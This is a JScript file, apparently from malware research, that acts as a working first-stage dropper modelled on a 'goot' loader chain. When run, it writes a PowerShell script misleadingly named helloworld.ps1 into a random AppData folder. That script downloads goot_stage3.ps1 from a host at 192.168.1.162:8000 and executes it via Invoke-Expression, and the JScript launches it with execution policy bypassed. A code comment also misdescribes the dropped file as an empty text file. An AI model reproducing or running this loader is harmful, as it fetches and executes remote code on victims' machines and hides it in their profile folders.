// FILEPATH: This file is JScript.
// this will not use Node.js, but will run in Windows Script Host when double-clicked.

// Add a global error flag
var errorFlag = false;

// Add "hello world" to "D:\SoftwareDevelopment\MalResearch\log.txt"
function addHelloWorld() {
        var logPath = 'D:\\SoftwareDevelopment\\MalResearch\\log.txt';
        var file = WScript.CreateObject('Scripting.FileSystemObject').OpenTextFile(logPath, 8, true);
        file.WriteLine('hello world');
        file.Close();
    }

// Add a debug logging function to "D:\SoftwareDevelopment\MalResearch\log.txt"
function debugLog(message) {
        var logPath = 'D:\\SoftwareDevelopment\\MalResearch\\log.txt';
    var file = WScript.CreateObject('Scripting.FileSystemObject').OpenTextFile(logPath, 8, true);
    var currentDate = new Date().toLocaleString();
    file.WriteLine(currentDate + ' - ' + message);
    file.Close();
}

// select a random folder from the AppData folder; use error handling where appropriate
function getRandomFolder() {
    var debug = true;
    try {
        if (!errorFlag) {
            var appDataPath = WScript.CreateObject('WScript.Shell').ExpandEnvironmentStrings('%APPDATA%');
            var localFolderPath = appDataPath;
            if (debug) {
                debugLog('localFolderPath: ' + localFolderPath);
            }
            var fso = WScript.CreateObject('Scripting.FileSystemObject');
            if (debug) {
                debugLog('fso: ' + fso);
            }
            var localFolder = fso.GetFolder(localFolderPath);
            if (debug) {
                debugLog('localFolder: ' + localFolder);
            }
            var folders = localFolder.SubFolders;
            var folderNames = [];
            for (var folderItem = new Enumerator(folders); !folderItem.atEnd(); folderItem.moveNext()) {
                folderNames.push(folderItem.item().Name);
            }
            if (debug) {
                debugLog('folders: ' + folderNames.join(', '));
            }

            var randomIndex = Math.floor(Math.random() * folders.Count);
            if (debug) {
                debugLog('randomIndex: ' + randomIndex);
            }

            var folderItem;
            var i = 0;
            for (var folderEnum = new Enumerator(folders); !folderEnum.atEnd(); folderEnum.moveNext()) {
                if (i === randomIndex) {
                    folderItem = folderEnum.item();
                    break;
                }
                i++;
            }

            if (debug) {
                debugLog('folders.Item(randomIndex): ' + (folderItem ? folderItem.Name : 'No folder at this index'));
            }

            return folderItem.Name;
        }
    } catch (error) {
        debugLog('An error occurred in getRandomFolder(): ' + error.message);
        errorFlag = true;
    }
}

function addFileToFolder(folder) {
    try {
        if (!errorFlag) {
            var filePath = WScript.CreateObject('WScript.Shell').ExpandEnvironmentStrings('%APPDATA%') + '\\' + folder + '\\helloworld.ps1';
            var fileSystem = WScript.CreateObject('Scripting.FileSystemObject');
            var file = fileSystem.CreateTextFile(filePath, true);
            
            // Add text to the file
            var text = '$url = \'http://192.168.1.162:8000/goot_stage3.ps1\'\n' +
                       '$outputFile = \'' + WScript.CreateObject('WScript.Shell').ExpandEnvironmentStrings('%APPDATA%') + '\\' + folder + '\\goot_stage3.ps1\'\n' +
                       'Invoke-WebRequest -Uri $url -OutFile $outputFile\n' +
                       '\n' +
                       '# Execute the final payload\n' +
                       '$content = Get-Content -Path $outputFile -Raw\n' +
                       'Invoke-Expression $content';
            file.WriteLine(text);
            
            file.Close();
        }
    } catch (error) {
        debugLog('An error occurred in addFileToFolder(): ' + error.message);
        errorFlag = true;
    }
}

// Create a function to execute the '\\helloworld.ps1' file 
function executePowerShellScript(folder) {
    try {
        if (!errorFlag) {
            var filePath = WScript.CreateObject('WScript.Shell').ExpandEnvironmentStrings('%APPDATA%') + '\\' + folder + '\\helloworld.ps1';
            var shell = new ActiveXObject('WScript.Shell');
            shell.Run('powershell.exe -ExecutionPolicy Bypass -File "' + filePath + '"');
        }
    } catch (error) {
        debugLog('An error occurred in executePowerShellScript(): ' + error.message);
        errorFlag = true;
    }
}


function logFolder(folder) {
    try {
        if (!errorFlag) {
            // output the folder value to debugLog, starting with "The folder is: "
            debugLog('The folder is: ' + folder);
        }
    } catch (error) {
        debugLog('An error occurred in logFolder(): ' + error.message);
        errorFlag = true;
    }
}

// Main function
function main() {
    // addHelloWorld();
    // select a random folder from the AppData folder
    var folder = getRandomFolder();
    
    // Add an empty file "helloworld.txt" to the selected folder
    addFileToFolder(folder);

    // Create a log entry in "c:\testing\log.txt" with the selected folder
    logFolder(folder);

    // Call executePowerShellScript(folder)
    executePowerShellScript(folder);
    
    // print "done" to the console
    debugLog('done with first stage');
}

// Run the main function
main();
